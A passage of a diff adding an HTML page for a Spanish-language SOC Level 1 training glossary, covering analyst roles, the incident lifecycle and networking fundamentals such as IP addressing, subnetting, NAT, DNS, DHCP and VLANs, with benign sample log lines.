@@ -1,0 +1,2094 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Glosario Maestro SOC L1 — Manual completo de entrenamiento para Analista de Centro de Operaciones de Seguridad Nivel 1. Fundamentos de redes, sistemas operativos, ciberseguridad, herramientas SOC y más.">
+    <meta name="keywords" content="SOC, L1, Analista, Seguridad, Ciberseguridad, SIEM, EDR, Redes, Glosario, Training">
+    <title>🛡️ Glosario Maestro SOC L1 — Manual de Entrenamiento</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<!-- Progress Bar -->
+<div class="progress-bar" id="progressBar"></div>
+
+<!-- Sidebar Overlay (Mobile) -->
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+<!-- Sidebar Navigation -->
+<aside class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+        <div class="sidebar-logo">🛡️</div>
+        <h1 class="sidebar-title">SOC L1</h1>
+        <p class="sidebar-subtitle">Glosario Maestro</p>
+    </div>
+
+    <nav class="sidebar-nav">
+        <a href="#introduccion" class="nav-link active" data-section="introduccion">
+            <span class="nav-icon">🏠</span>
+            <span class="nav-text">Introducción</span>
+        </a>
+
+        <div class="nav-section">
+            <a href="exam.html" class="nav-link">
+                <span class="nav-icon">📝</span>
+                <span class="nav-text">Examen SOC L1</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-1" class="nav-link" data-section="seccion-1">
+                <span class="nav-icon">🌐</span>
+                <span class="nav-text">1. Fundamentos de Redes</span>
+            </a>
+            <a href="#sec-1-1" class="nav-sublink" data-section="sec-1-1">1.1 Conceptos de Red</a>
+            <a href="#sec-1-2" class="nav-sublink" data-section="sec-1-2">1.2 Protocolos de Red</a>
+            <a href="#sec-1-3" class="nav-sublink" data-section="sec-1-3">1.3 Modelos de Red</a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-2" class="nav-link" data-section="seccion-2">
+                <span class="nav-icon">💻</span>
+                <span class="nav-text">2. Sistemas Operativos</span>
+            </a>
+            <a href="#sec-2-1" class="nav-sublink" data-section="sec-2-1">2.1 Windows</a>
+            <a href="#sec-2-2" class="nav-sublink" data-section="sec-2-2">2.2 Linux</a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-3" class="nav-link" data-section="seccion-3">
+                <span class="nav-icon">🔒</span>
+                <span class="nav-text">3. Ciberseguridad Básica</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-4" class="nav-link" data-section="seccion-4">
+                <span class="nav-icon">📊</span>
+                <span class="nav-text">4. Logs y Monitoreo</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-5" class="nav-link" data-section="seccion-5">
+                <span class="nav-icon">🔧</span>
+                <span class="nav-text">5. Herramientas SOC</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-6" class="nav-link" data-section="seccion-6">
+                <span class="nav-icon">📐</span>
+                <span class="nav-text">6. Frameworks</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-7" class="nav-link" data-section="seccion-7">
+                <span class="nav-icon">🎯</span>
+                <span class="nav-text">7. Threat Hunting</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-8" class="nav-link" data-section="seccion-8">
+                <span class="nav-icon">🚨</span>
+                <span class="nav-text">8. Respuesta a Incidentes</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-9" class="nav-link" data-section="seccion-9">
+                <span class="nav-icon">☁️</span>
+                <span class="nav-text">9. Cloud Security</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-10" class="nav-link" data-section="seccion-10">
+                <span class="nav-icon">📖</span>
+                <span class="nav-text">10. Glosario Alfabético</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-11" class="nav-link" data-section="seccion-11">
+                <span class="nav-icon">🧪</span>
+                <span class="nav-text">11. Laboratorios</span>
+            </a>
+        </div>
+
+        <div class="nav-section">
+            <a href="#seccion-12" class="nav-link" data-section="seccion-12">
+                <span class="nav-icon">🗺️</span>
+                <span class="nav-text">12. Ruta de Aprendizaje</span>
+            </a>
+        </div>
+    </nav>
+
+    <div class="sidebar-footer">
+        <div class="progress-info">
+            <span class="progress-label">Progreso</span>
+            <span class="progress-percent" id="progressPercent">0%</span>
+        </div>
+        <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="sidebar-version">v1.0 — Español</div>
+    </div>
+</aside>
+
+<!-- Top Bar -->
+<header class="topbar" id="topbar">
+    <button class="mobile-toggle" id="mobileToggle" aria-label="Abrir menú">
+        <span></span><span></span><span></span>
+    </button>
+    <div class="topbar-center">
+        <div class="search-container">
+            <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="m21 21-4.35-4.35"></path>
+            </svg>
+            <input type="text" class="search-input" id="searchInput" placeholder="Buscar conceptos... (Ctrl+K)" autocomplete="off">
+            <kbd class="search-kbd">Ctrl+K</kbd>
+            <div class="search-results" id="searchResults"></div>
+        </div>
+    </div>
+</header>
+
+<!-- Main Content -->
+<main class="main-content" id="mainContent">
+
+    <!-- ============================== -->
+    <!-- INTRODUCCIÓN                   -->
+    <!-- ============================== -->
+    <section class="section" id="introduccion">
+        <div class="section-header">
+            <div class="section-badge">INTRODUCCIÓN</div>
+            <h1 class="section-title gradient-text">🛡️ Glosario Maestro SOC L1</h1>
+            <p class="section-intro">Manual Completo de Entrenamiento para Analista de Centro de Operaciones de Seguridad — Nivel 1</p>
+            <a href="exam.html" class="btn btn-primary" style="margin-top: 18px; display: inline-flex; align-items: center; gap: 8px;">📝 Ir al Examen SOC L1</a>
+        </div>
+
+        <div class="card">
+            <h2>¿Qué es un SOC?</h2>
+            <div class="definition-block">
+                <p>Un <strong>Security Operations Center (SOC)</strong> — Centro de Operaciones de Seguridad — es una unidad centralizada dentro de una organización responsable de <strong>monitorear, detectar, analizar y responder</strong> a amenazas e incidentes de ciberseguridad en tiempo real, las 24 horas del día, los 7 días de la semana.</p>
+            </div>
+
+            <div class="ascii-art">
+<pre>
+┌─────────────────────────────────────────────────────────┐
+│                  CENTRO DE OPERACIONES                  │
+│                   DE SEGURIDAD (SOC)                    │
+│                                                         │
+│  ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌────────┐  │
+│  │  SOC L1  │──▶│  SOC L2  │──▶│  SOC L3  │──▶│Forense │  │
+│  │ Triage   │   │Análisis │   │Respuesta│   │Digital │  │
+│  └─────────┘   └─────────┘   └─────────┘   └────────┘  │
+│                                                         │
+│  Alimentado por: SIEM │ EDR │ IDS/IPS │ Logs │ TI       │
+└─────────────────────────────────────────────────────────┘
+</pre>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Funciones principales de un SOC</h3>
+            <table class="data-table">
+                <thead>
+                    <tr><th>Función</th><th>Descripción</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Monitoreo continuo</strong></td><td>Vigilancia 24/7 de infraestructura, redes y endpoints</td></tr>
+                    <tr><td><strong>Detección de amenazas</strong></td><td>Identificar actividades maliciosas mediante alertas y correlaciones</td></tr>
+                    <tr><td><strong>Respuesta a incidentes</strong></td><td>Contener, erradicar y recuperarse de incidentes de seguridad</td></tr>
+                    <tr><td><strong>Threat Hunting</strong></td><td>Búsqueda proactiva de amenazas que no disparan alertas automáticas</td></tr>
+                    <tr><td><strong>Gestión de vulnerabilidades</strong></td><td>Identificar y priorizar debilidades en la infraestructura</td></tr>
+                    <tr><td><strong>Cumplimiento</strong></td><td>Asegurar que los controles cumplen normativas (ISO 27001, PCI-DSS, etc.)</td></tr>
+                    <tr><td><strong>Inteligencia de amenazas</strong></td><td>Consumir y aplicar información sobre actores y técnicas maliciosas</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h2>¿Qué hace un Analista SOC L1?</h2>
+            <p>El <strong>Analista SOC Nivel 1</strong> es la primera línea de defensa en el SOC. Es responsable de:</p>
+            <ul>
+                <li>Revisar y hacer <strong>triage</strong> (clasificación) de alertas generadas por el SIEM</li>
+                <li>Determinar si una alerta es un <strong>verdadero positivo</strong> o un <strong>falso positivo</strong></li>
+                <li>Documentar los hallazgos en el sistema de tickets</li>
+                <li><strong>Escalar</strong> incidentes complejos al Nivel 2 o Nivel 3</li>
+                <li>Monitorear dashboards de seguridad en tiempo real</li>
+                <li>Ejecutar playbooks definidos para tipos de incidentes conocidos</li>
+            </ul>
+            <div class="analogy-box">
+                <strong>💡 Analogía:</strong> El Analista SOC L1 es como el operador de una sala de emergencias: recibe todas las llamadas (alertas), evalúa cuáles son emergencias reales y cuáles son falsas alarmas, y deriva los casos graves al especialista adecuado.
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Diferencias entre SOC L1, L2 y L3</h3>
+            <table class="data-table comparison-table">
+                <thead>
+                    <tr><th>Aspecto</th><th>SOC L1</th><th>SOC L2</th><th>SOC L3</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Rol</strong></td><td>Analista de Alertas (Triage)</td><td>Analista de Incidentes</td><td>Experto / Threat Hunter</td></tr>
+                    <tr><td><strong>Experiencia</strong></td><td>0–2 años</td><td>2–5 años</td><td>5+ años</td></tr>
+                    <tr><td><strong>Tareas</strong></td><td>Revisión de alertas, escalado, documentación</td><td>Análisis profundo, correlación, forense básico</td><td>IR avanzado, Threat Hunting, Malware Analysis</td></tr>
+                    <tr><td><strong>Herramientas</strong></td><td>SIEM, Ticketing, EDR básico</td><td>SIEM avanzado, EDR, Forense, TI</td><td>Todas + Reversing, Forense avanzado</td></tr>
+                    <tr><td><strong>Autonomía</strong></td><td>Baja (siguen playbooks)</td><td>Media</td><td>Alta</td></tr>
+                    <tr><td><strong>Escalación</strong></td><td>Escala a L2</td><td>Escala a L3</td><td>Escala a CISO</td></tr>
+                    <tr><td><strong>Certificaciones</strong></td><td>CompTIA Sec+, SC-200, CySA+</td><td>CEH, GCIH, ECIH</td><td>GREM, GCFE, OSCP</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Responsabilidades Diarias — Turno de Mañana (ejemplo)</h3>
+            <div class="timeline">
+                <div class="timeline-item"><span class="timeline-time">08:00</span><span class="timeline-desc">Recibir briefing del turno anterior (handover)</span></div>
+                <div class="timeline-item"><span class="timeline-time">08:15</span><span class="timeline-desc">Revisar la cola de alertas pendientes en el SIEM</span></div>
+                <div class="timeline-item"><span class="timeline-time">09:00</span><span class="timeline-desc">Iniciar triage de alertas nuevas (prioridad alta primero)</span></div>
+                <div class="timeline-item"><span class="timeline-time">10:30</span><span class="timeline-desc">Documentar hallazgos en sistema de tickets (ServiceNow, Jira)</span></div>
+                <div class="timeline-item"><span class="timeline-time">11:00</span><span class="timeline-desc">Escalar incidente de phishing confirmado a L2</span></div>
+                <div class="timeline-item"><span class="timeline-time">12:00</span><span class="timeline-desc">Seguimiento de tickets abiertos</span></div>
+                <div class="timeline-item"><span class="timeline-time">13:00</span><span class="timeline-desc">Revisar dashboards de estado (seguridad, disponibilidad)</span></div>
+                <div class="timeline-item"><span class="timeline-time">14:00</span><span class="timeline-desc">Ejecutar playbook de análisis de URL sospechosa</span></div>
+                <div class="timeline-item"><span class="timeline-time">15:00</span><span class="timeline-desc">Actualizar documentación de incidente en curso</span></div>
+                <div class="timeline-item"><span class="timeline-time">16:00</span><span class="timeline-desc">Preparar resumen para handover al turno siguiente</span></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Flujo de Trabajo de un SOC</h3>
+            <div class="ascii-art">
+<pre>
+     FUENTES DE DATOS
+┌─────────────────────────┐
+│ Firewalls │ EDR │ IDS   │
+│ Proxies   │ DNS │ Cloud │
+│ Servidores│ AD  │ VPN   │
+└─────────────────────────┘
+           │
+           ▼
+      ┌─────────┐
+      │  SIEM   │  ◀── Normalización y correlación
+      └─────────┘
+           │
+           ▼ Alerta generada
+      ┌─────────┐
+      │  SOC L1 │  ◀── Triage: ¿Es real? ¿Falso positivo?
+      └─────────┘
+           │
+     ┌─────┴──────┐
+     │            │
+     ▼            ▼
+ Falso        Verdadero
+ Positivo     Positivo
+     │            │
+  Cerrar       Escalar
+  ticket       a L2/L3
+               │
+               ▼
+         ┌──────────┐
+         │ IR Team  │  ◀── Contención, erradicación, recuperación
+         └──────────┘
+               │
+               ▼
+         Lessons Learned
+         + Post-Mortem
+</pre>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Ciclo de Vida de un Incidente (NIST SP 800-61)</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1">
+                    <span class="flow-number">1</span>
+                    <strong>PREPARACIÓN</strong>
+                    <p>Playbooks, herramientas, entrenamiento, procesos</p>
+                </div>
+                <div class="flow-step flow-step-2">
+                    <span class="flow-number">2</span>
+                    <strong>DETECCIÓN Y ANÁLISIS</strong>
+                    <p>Alertas SIEM, análisis de logs, triage, clasificación</p>
+                </div>
+                <div class="flow-step flow-step-3">
+                    <span class="flow-number">3</span>
+                    <strong>CONTENCIÓN</strong>
+                    <p>Corto plazo: aislar equipo. Largo plazo: bloquear IPs, deshabilitar cuentas</p>
+                </div>
+                <div class="flow-step flow-step-4">
+                    <span class="flow-number">4</span>
+                    <strong>ERRADICACIÓN</strong>
+                    <p>Eliminar malware, parchear vulnerabilidades</p>
+                </div>
+                <div class="flow-step flow-step-5">
+                    <span class="flow-number">5</span>
+                    <strong>RECUPERACIÓN</strong>
+                    <p>Restaurar servicios, monitoreo intensivo post-incidente</p>
+                </div>
+                <div class="flow-step flow-step-6">
+                    <span class="flow-number">6</span>
+                    <strong>LECCIONES APRENDIDAS</strong>
+                    <p>Post-mortem, actualización de playbooks, mejoras</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 1 — FUNDAMENTOS REDES -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-1">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 1</div>
+            <h1 class="section-title">🌐 Fundamentos de Redes</h1>
+            <p class="section-intro">Conocimientos esenciales de networking para el Analista SOC. Desde direcciones IP hasta modelos de referencia.</p>
+        </div>
+    </section>
+
+    <!-- Sub-sección 1.1 -->
+    <section class="section" id="sec-1-1">
+        <h2 class="subsection-title">1.1 Conceptos de Red</h2>
+
+        <!-- IP -->
+        <div class="card" id="concept-ip">
+            <div class="card-header-row">
+                <h3>IP — Internet Protocol Address</h3>
+                <div class="tool-tags">
+                    <span class="tool-tag">Wireshark</span>
+                    <span class="tool-tag">tcpdump</span>
+                    <span class="tool-tag">nmap</span>
+                    <span class="tool-tag">SIEM</span>
+                </div>
+            </div>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Identificador numérico único asignado a cada dispositivo en una red que utiliza el protocolo IP para comunicarse. Funciona como la "dirección postal" de un dispositivo en internet o en una red privada.</p>
+            </div>
+            <div class="analogy-box">
+                <strong>💡 Explicación simple:</strong> Es como el número de tu casa. Sin él, nadie puede enviarte ni recibir información de ti.
+            </div>
+            <div class="key-concept">
+                <strong>Importancia en SOC:</strong> Los analistas SOC utilizan direcciones IP para rastrear el origen y destino de conexiones sospechosas, correlacionar actividad maliciosa y aplicar controles como bloqueos.
+            </div>
+
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo práctico</span><button class="copy-btn">Copiar</button></div>
+<pre>Fuente: 192.168.1.50 → Destino: 8.8.8.8 puerto 443
+Esto indica una conexión desde una IP interna al DNS de Google por HTTPS.</pre>
+            </div>
+
+            <h4>Tipos de IP</h4>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Descripción</th><th>Ejemplo</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Pública</strong></td><td>Visible en internet, asignada por ISP</td><td>203.0.113.45</td></tr>
+                    <tr><td><strong>Privada</strong></td><td>Uso interno, no enrutable en internet</td><td>192.168.1.1</td></tr>
+                    <tr><td><strong>Loopback</strong></td><td>Dirección local del propio equipo</td><td>127.0.0.1</td></tr>
+                    <tr><td><strong>APIPA</strong></td><td>Auto-asignada cuando no hay DHCP</td><td>169.254.x.x</td></tr>
+                </tbody>
+            </table>
+
+            <h4>Rangos de IP Privadas (RFC 1918)</h4>
+            <div class="code-block">
+                <div class="code-header"><span>RFC 1918</span><button class="copy-btn">Copiar</button></div>
+<pre>Clase A:  10.0.0.0    – 10.255.255.255   (/8)
+Clase B:  172.16.0.0  – 172.31.255.255   (/12)
+Clase C:  192.168.0.0 – 192.168.255.255  (/16)</pre>
+            </div>
+
+            <div class="alert-warning">
+                <strong>⚠️ Riesgos asociados:</strong> IP spoofing (suplantación de IP), escaneo de puertos, rastreo de usuarios.
+            </div>
+        </div>
+
+        <!-- IPv4 -->
+        <div class="card" id="concept-ipv4">
+            <h3>IPv4 — Internet Protocol Version 4</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Cuarta versión del protocolo de internet. Utiliza direcciones de 32 bits representadas en notación decimal separada por puntos (cuatro octetos de 0 a 255).</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Estructura IPv4</span><button class="copy-btn">Copiar</button></div>
+<pre>  192    .   168    .     1    .    10
+11000000   10101000   00000001   00001010
+(Octeto 1) (Octeto 2) (Octeto 3) (Octeto 4)</pre>
+            </div>
+            <p><strong>Capacidad:</strong> 2³² = ~4.300 millones de direcciones únicas.</p>
+            <div class="key-concept">
+                <strong>Importancia en SOC:</strong> La mayoría de las redes corporativas actuales aún usan IPv4. Los analistas deben poder leer e interpretar direcciones IPv4 en logs.
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo de log</span><button class="copy-btn">Copiar</button></div>
+<pre>Mar 15 09:23:11 firewall DENY src=192.168.10.55 dst=45.33.32.156 dport=22 proto=TCP
+→ Intento de conexión SSH desde IP interna a IP externa, bloqueado por firewall.</pre>
+            </div>
+        </div>
+
+        <!-- IPv6 -->
+        <div class="card" id="concept-ipv6">
+            <h3>IPv6 — Internet Protocol Version 6</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Sexta versión del protocolo de internet. Utiliza direcciones de 128 bits representadas en notación hexadecimal separada por dos puntos.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Estructura IPv6</span><button class="copy-btn">Copiar</button></div>
+<pre>2001:0db8:85a3:0000:0000:8a2e:0370:7334
+
+Capacidad: 2¹²⁸ = ~340 undecillones de direcciones
+
+Abreviación:
+Completa:    2001:0db8:0000:0000:0000:0000:0000:0001
+Abreviada:   2001:db8::1</pre>
+            </div>
+            <div class="alert-critical">
+                <strong>🚨 Riesgo real:</strong> Organizaciones que no monitorean IPv6 pueden tener un "punto ciego" que los atacantes explotan activamente para tunelizar tráfico. Muchos atacantes utilizan IPv6 para evadir controles configurados solo para IPv4.
+            </div>
+        </div>
+
+        <!-- MAC Address -->
+        <div class="card" id="concept-mac">
+            <h3>MAC Address — Media Access Control Address</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Identificador único de 48 bits asignado a la interfaz de red de un dispositivo por el fabricante. Opera en la Capa 2 del modelo OSI.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Formato MAC</span><button class="copy-btn">Copiar</button></div>
+<pre>AA:BB:CC:DD:EE:FF
+└────────┘ └────────┘
+ OUI         NIC Specific
+(Fabricante)  (Único del dispositivo)
+
+OUI (Organizationally Unique Identifier) — Ejemplos:
+00:50:56 → VMware
+00:0C:29 → VMware (VMs)
+B8:27:EB → Raspberry Pi Foundation</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo práctico — Detección de anomalía</span><button class="copy-btn">Copiar</button></div>
+<pre>DHCP Log:
+DHCPACK 192.168.1.105 para MAC 00:0C:29:AB:CD:EF hostname=WORKSTATION-07
+
+→ Si el OUI indica que es una VM (00:0C:29) pero debería ser un equipo físico, 
+  podría indicar un atacante usando una máquina virtual para ocultarse.</pre>
+            </div>
+            <div class="alert-warning">
+                <strong>⚠️ Riesgo:</strong> MAC spoofing — un atacante cambia su dirección MAC para suplantar otro dispositivo o evadir controles de acceso a red (NAC).
+            </div>
+        </div>
+
+        <!-- Subnetting -->
+        <div class="card" id="concept-subnetting">
+            <h3>Subnetting — Subredes</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Proceso de dividir una red IP en redes más pequeñas (subredes) usando máscaras de subred. Permite organizar y segmentar la red para mejorar rendimiento y seguridad.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Componentes de una subred</span><button class="copy-btn">Copiar</button></div>
+<pre>Dirección de red:  192.168.1.0
+Máscara de subred: 255.255.255.0  (/24)
+Rango usable:      192.168.1.1 – 192.168.1.254
+Broadcast:         192.168.1.255
+Total hosts:       254</pre>
+            </div>
+
+            <h4>Tabla de Máscaras Comunes</h4>
+            <table class="data-table">
+                <thead><tr><th>CIDR</th><th>Máscara</th><th>Hosts usables</th><th>Uso típico</th></tr></thead>
+                <tbody>
+                    <tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>Clase A</td></tr>
+                    <tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>Clase B</td></tr>
+                    <tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Red de oficina típica</td></tr>
+                    <tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Segmento pequeño (DMZ)</td></tr>
+                    <tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Enlace punto a punto</td></tr>
+                    <tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>Host específico</td></tr>
+                </tbody>
+            </table>
+
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo SOC — Movimiento lateral</span><button class="copy-btn">Copiar</button></div>
+<pre>Alerta: 10.20.30.55 intentó conectarse a 10.20.50.10
+→ Ambas IPs son internas pero en subredes distintas (30.x vs 50.x)
+→ Esto puede indicar movimiento lateral entre segmentos de red
+→ Requiere investigación de por qué un equipo del segmento 30 contacta al 50</pre>
+            </div>
+        </div>
+
+        <!-- Gateway -->
+        <div class="card" id="concept-gateway">
+            <h3>Gateway (Puerta de Enlace)</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Dispositivo de red (generalmente un router) que actúa como punto de salida de una red local hacia otras redes, incluyendo internet.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo</span><button class="copy-btn">Copiar</button></div>
+<pre>Red local: 192.168.1.0/24
+Gateway:   192.168.1.1 (router/firewall)
+Si un host quiere salir a internet, el tráfico pasa por 192.168.1.1</pre>
+            </div>
+            <div class="key-concept">
+                <strong>Importancia en SOC:</strong> El gateway (normalmente el firewall) es el primer y último punto de control del tráfico. Sus logs son fundamentales para el monitoreo SOC.
+            </div>
+        </div>
+
+        <!-- NAT -->
+        <div class="card" id="concept-nat">
+            <h3>NAT — Network Address Translation</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Técnica que permite traducir direcciones IP privadas a una dirección IP pública para comunicarse con internet, y viceversa.</p>
+            </div>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Descripción</th><th>Uso</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Static NAT</strong></td><td>1 IP privada → 1 IP pública fija</td><td>Servidores expuestos</td></tr>
+                    <tr><td><strong>Dynamic NAT</strong></td><td>Pool de IPs públicas asignadas dinámicamente</td><td>Entornos empresariales</td></tr>
+                    <tr><td><strong>PAT/Overload</strong></td><td>Múltiples IPs privadas → 1 IP pública (con puertos)</td><td>Hogar/empresa típica</td></tr>
+                </tbody>
+            </table>
+            <div class="code-block">
+                <div class="code-header"><span>Log NAT</span><button class="copy-btn">Copiar</button></div>
+<pre>[NAT] 192.168.1.100:54321 → 203.0.113.10:80 traducido a 198.51.100.5:54321</pre>
+            </div>
+            <div class="alert-info">
+                <strong>ℹ️ Nota SOC:</strong> NAT puede dificultar el rastreo de origen de ataques ya que múltiples usuarios pueden compartir una IP pública. Los logs de NAT son críticos para correlacionar.
+            </div>
+        </div>
+
+        <!-- DNS -->
+        <div class="card" id="concept-dns">
+            <div class="card-header-row">
+                <h3>DNS — Domain Name System</h3>
+                <span class="risk-badge risk-critical">CRÍTICO PARA SOC</span>
+            </div>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Sistema jerárquico y distribuido que traduce nombres de dominio legibles por humanos (como <code>www.google.com</code>) a direcciones IP numéricas.</p>
+            </div>
+            <div class="ascii-art">
+<pre>
+Usuario escribe: www.ejemplo.com
+    │
+    ▼
+1. Consulta al Resolver DNS local (cache)
+    │ (si no está en cache)
+    ▼
+2. Consulta al Root Name Server (.)
+    │
+    ▼
+3. Consulta al TLD Server (.com)
+    │
+    ▼
+4. Consulta al Authoritative Server (ejemplo.com)
+    │
+    ▼
+5. Respuesta: 93.184.216.34
+</pre>
+            </div>
+
+            <h4>Tipos de Registros DNS</h4>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Descripción</th><th>Ejemplo</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>A</strong></td><td>IPv4 address</td><td>ejemplo.com → 93.184.216.34</td></tr>
+                    <tr><td><strong>AAAA</strong></td><td>IPv6 address</td><td>ejemplo.com → 2606:2800:220:1:...</td></tr>
+                    <tr><td><strong>CNAME</strong></td><td>Alias a otro dominio</td><td>www → ejemplo.com</td></tr>
+                    <tr><td><strong>MX</strong></td><td>Servidor de correo</td><td>mail.ejemplo.com</td></tr>
+                    <tr><td><strong>TXT</strong></td><td>Texto arbitrario (SPF, DKIM)</td><td>"v=spf1 include:..."</td></tr>
+                    <tr><td><strong>PTR</strong></td><td>Lookup inverso (IP → nombre)</td><td>34.216.184.93 → ejemplo.com</td></tr>
+                    <tr><td><strong>NS</strong></td><td>Servidor de nombres</td><td>ns1.ejemplo.com</td></tr>
+                    <tr><td><strong>SOA</strong></td><td>Start of Authority</td><td>Info de la zona DNS</td></tr>
+                </tbody>
+            </table>
+
+            <p><strong>Puertos DNS:</strong> UDP/53 (consultas normales) · TCP/53 (transferencias de zona) · TCP/853 (DNS over TLS)</p>
+
+            <h4>Alertas DNS comunes en SOC</h4>
+            <div class="code-block">
+                <div class="code-header"><span>Patrones de ataque DNS</span><button class="copy-btn">Copiar</button></div>
+<pre>1. DNS Tunneling:     consultas DNS anormalmente largas o frecuentes
+2. DGA (Domain Gen):  dominios generados algorítmicamente (abc123xyz.ru)
+3. Fast Flux:         IP cambia cada pocos segundos para el mismo dominio
+4. Typosquatting:     micros0ft.com en vez de microsoft.com
+5. C2 over DNS:       malware usa DNS para recibir comandos del atacante</pre>
+            </div>
+            <div class="alert-critical">
+                <strong>🚨 Riesgos:</strong> DNS hijacking, DNS poisoning, DNS tunneling, DGA malware.
+            </div>
+        </div>
+
+        <!-- DHCP -->
+        <div class="card" id="concept-dhcp">
+            <h3>DHCP — Dynamic Host Configuration Protocol</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Protocolo cliente-servidor que asigna automáticamente configuración de red (IP, máscara, gateway, DNS) a los dispositivos cuando se conectan.</p>
+            </div>
+            <p><strong>Puerto:</strong> UDP/67 (servidor), UDP/68 (cliente)</p>
+
+            <h4>Proceso DORA</h4>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">D</span><strong>DISCOVER</strong><p>Cliente envía broadcast buscando servidor DHCP</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">O</span><strong>OFFER</strong><p>Servidor ofrece una IP disponible</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">R</span><strong>REQUEST</strong><p>Cliente solicita la IP ofrecida</p></div>
+                <div class="flow-step flow-step-4"><span class="flow-number">A</span><strong>ACK</strong><p>Servidor confirma la asignación</p></div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo de log DHCP (Windows)</span><button class="copy-btn">Copiar</button></div>
+<pre>15/03/2024 09:23:45 Assign     192.168.1.105  WORKSTATION-07  00:0C:29:AB:CD:EF
+15/03/2024 09:23:45 DNS Update  workstation-07.corp.local  192.168.1.105</pre>
+            </div>
+        </div>
+
+        <!-- VLAN -->
+        <div class="card" id="concept-vlan">
+            <h3>VLAN — Virtual Local Area Network</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Segmentación lógica de una red física que permite crear redes virtuales independientes dentro del mismo hardware.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo de segmentación</span><button class="copy-btn">Copiar</button></div>
+<pre>VLAN 10 - Empleados:       192.168.10.0/24
+VLAN 20 - Servidores:      192.168.20.0/24
+VLAN 30 - Invitados:       192.168.30.0/24
+VLAN 40 - IoT/Cámaras:     192.168.40.0/24
+VLAN 99 - Management:      192.168.99.0/24</pre>
+            </div>
+            <div class="alert-warning">
+                <strong>⚠️ Riesgo:</strong> VLAN hopping — técnica donde un atacante consigue acceder a otra VLAN usando ataques como double tagging.
+            </div>
+        </div>
+
+        <!-- CIDR -->
+        <div class="card" id="concept-cidr">
+            <h3>CIDR — Classless Inter-Domain Routing</h3>
+            <div class="definition-block">
